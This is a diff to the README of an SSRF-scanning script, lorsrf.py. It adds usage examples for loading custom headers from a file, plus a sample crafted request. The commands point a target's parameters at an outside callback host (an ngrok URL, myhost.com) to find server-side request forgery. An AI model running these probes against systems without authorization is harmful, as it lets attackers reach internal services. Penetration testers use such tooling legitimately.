@@ -38,6 +38,21 @@ $ cat paramters.txt | python3 lorsrf.py -t http://target.com -s http://53252.ngr
 ```bash
 $ cat paramters.txt | python3 lorsrf.py -t http://target.com -s http://53252.ngrok.io -c 'user=5&PHPSESSION=5232'
 ```
+  * add headers from text file
+```bash
+
+$ cat headers.txt
+Cookie: test=1
+Auth: Basic TG9yU3JmCg==
+
+$ cat parameters.txt | python3 lorsrf.py -f headers.txt -s 'http://myhost.com' -t 'http://ssrf.hack.com'
+
+---------------------
+GET /?parameter={YOUR_HOST} HTTP/1.1
+Host: targer.com
+Cookie: test=1
+Auth: Basic TG9yU3JmCg==
+```
   * Follow redirects
 ```bash
 $ cat paramters.txt | python3 lorsrf.py -t http://target.com -s http://53252.ngrok.io -r
